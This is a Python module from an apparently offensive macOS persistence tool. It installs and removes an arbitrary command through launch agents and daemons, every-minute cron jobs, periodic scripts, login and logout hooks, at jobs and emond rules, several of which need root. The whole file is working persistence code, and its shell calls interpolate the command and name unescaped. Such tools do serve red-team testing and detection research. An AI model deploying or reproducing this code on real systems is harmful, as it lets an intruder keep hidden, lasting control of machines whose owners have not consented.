"""poisonapple.techniques"""

import os

from crontab import CronTab
from poisonapple.util import print_error, write_plist, uninstall_plist, custom_plist


class Technique:
    def __init__(self, technique, name, command, root_required=False):
        self.technique = technique
        self.name = name
        self.command = command
        self.root_required = root_required
        self.success = False
        self.error_message = str()

    def display_result(self):
        if self.success:
            print_error('success', text=self.technique)
        else:
            print_error('failure', text=self.technique)
            print_error('python_error', text=self.error_message)

    @staticmethod
    def execute(func):
        def wrapper(self):
            if self.root_required and not os.geteuid() == 0:
                self.error_message = 'Root access is required for this technique.'
            else:
                try:
                    func(self)
                    self.success = True
                except Exception as e:
                    self.error_message = str(e)
            self.display_result()
        return wrapper


class LaunchAgent(Technique):
    def __init__(self, name, command):
        super().__init__('LaunchAgent', name, command, root_required=True)

    @Technique.execute
    def run(self):
        write_plist(self.name, self.command, 2)

    @Technique.execute
    def remove(self):
        uninstall_plist(self.name, 2)


class LaunchAgentUser(Technique):
    def __init__(self, name, command):
        super().__init__('LaunchAgentUser', name, command, root_required=False)

    @Technique.execute
    def run(self):
        try:
            os.mkdir(os.path.join(f'/Users/{os.getlogin()}', 'Library/LaunchAgents'))
        except FileExistsError:
            pass
        write_plist(self.name, self.command, 1)

    @Technique.execute
    def remove(self):
        uninstall_plist(self.name, 1)


class LaunchDaemon(Technique):
    def __init__(self, name, command):
        super().__init__('LaunchDaemon', name, command, root_required=True)

    @Technique.execute
    def run(self):
        write_plist(self.name, self.command, 3)

    @Technique.execute
    def remove(self):
        uninstall_plist(self.name, 3)


class Cron(Technique):
    def __init__(self, name, command):
        super().__init__('Cron', name, command, root_required=False)

    @Technique.execute
    def run(self):
        cron = CronTab(user=os.getlogin())
        job = cron.new(command=self.command, comment=self.name)
        job.minute.every(1)
        cron.write()

    @Technique.execute
    def remove(self):
        cron_path = os.path.join('/usr/lib/cron/tabs/', os.getlogin())
        lines = list()
        with open(cron_path) as f:
            for line in f.readlines():
                if f'# {self.name}' in line:
                    continue
                lines.append(line)
        with open(cron_path, 'w') as f:
            for line in lines:
                f.write(line)


class CronRoot(Technique):
    def __init__(self, name, command):
        super().__init__('CronRoot', name, command, root_required=True)

    @Technique.execute
    def run(self):
        cron = CronTab(user='root')
        job = cron.new(command=self.command, comment=self.name)
        job.minute.every(1)
        cron.write()

    @Technique.execute
    def remove(self):
        cron_path = '/usr/lib/cron/tabs/root'
        lines = list()
        with open(cron_path) as f:
            for line in f.readlines():
                if f'# {self.name}' in line:
                    continue
                lines.append(line)
        with open(cron_path, 'w') as f:
            for line in lines:
                f.write(line)


class Periodic(Technique):
    def __init__(self, name, command):
        super().__init__('Periodic', name, command, root_required=True)

    @Technique.execute
    def run(self):
        periodic_path = f'/etc/periodic/daily/666.{self.name}'
        os.system(f'echo "#!/bin/sh" > {periodic_path}')
        os.system(f'echo {self.command} >> {periodic_path}')
        os.system(f'chmod 755 {periodic_path}')

    @Technique.execute
    def remove(self):
        os.remove(f'/etc/periodic/daily/666.{self.name}')


class LoginHook(Technique):
    def __init__(self, name, command):
        super().__init__('LoginHook', name, command, root_required=True)

    @Technique.execute
    def run(self):
        os.system(f'defaults write com.apple.loginwindow LoginHook "{self.command}"')

    @Technique.execute
    def remove(self):
        os.system('defaults delete com.apple.loginwindow LoginHook')


class LogoutHook(Technique):
    def __init__(self, name, command):
        super().__init__('LogoutHook', name, command, root_required=True)

    @Technique.execute
    def run(self):
        os.system(f'defaults write com.apple.loginwindow LogoutHook "{self.command}"')

    @Technique.execute
    def remove(self):
        os.system('defaults delete com.apple.loginwindow LogoutHook')


class AtJob(Technique):
    def __init__(self, name, command):
        super().__init__('AtJob', name, command, root_required=True)

    @Technique.execute
    def run(self):
        os.system('launchctl unload -F /System/Library/LaunchDaemons/com.apple.atrun.plist')
        os.system('launchctl load -w /System/Library/LaunchDaemons/com.apple.atrun.plist')
        # TODO: recurisve at command here?
        os.system(f'{self.command} | at +1 minute')

    @Technique.execute
    def remove(self):
        os.system('launchctl unload -F /System/Library/LaunchDaemons/com.apple.atrun.plist')


class Emond(Technique):
    def __init__(self, name, command):
        super().__init__('Emond', name, command, root_required=True)

    @Technique.execute
    def run(self):
        custom_plist(self.name, self.command, '/etc/emond.d/rules/')
        os.system(f'touch /private/var/db/emondClients/{self.name}')

    @Technique.execute
    def remove(self):
        os.remove(f'/etc/emond.d/rules/{self.name}.plist')
        os.remove(f'/private/var/db/emondClients/{self.name}')


technique_list = [
    AtJob,
    Cron,
    CronRoot,
    Emond,
    LaunchAgent,
    LaunchAgentUser,
    LaunchDaemon,
    LoginHook,
    LogoutHook,
    Periodic,
]